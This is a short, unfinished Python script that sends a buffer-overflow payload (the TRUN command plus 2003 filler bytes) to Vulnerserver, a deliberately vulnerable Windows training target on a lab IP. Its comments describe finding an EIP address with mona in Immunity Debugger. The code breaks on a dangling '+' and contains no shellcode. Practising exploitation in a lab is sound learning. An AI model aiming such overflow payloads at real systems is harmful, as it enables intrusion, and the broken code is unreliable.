#!/usr/bin/python
#buffer overflow attack 
#vulnerserver.exe running on windows 10 machine.
#use mona on immunity debugger find the EIP address in a dll.module 
import socket
import sys
#ADDRESS OF EIP 
shellcode="A"*2003+
#"B"*4 WILL BE THE EIP
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #socket.AF_INET: ipv4, SOCK_STREAM: port
    #port 9999 is the default open port of vulnerserver
    #ip is the ip of windows 10 
connect=s.connect(('192.168.179.134',9999))
s.send(('TRUN /.:/'+shellcode))
s.close()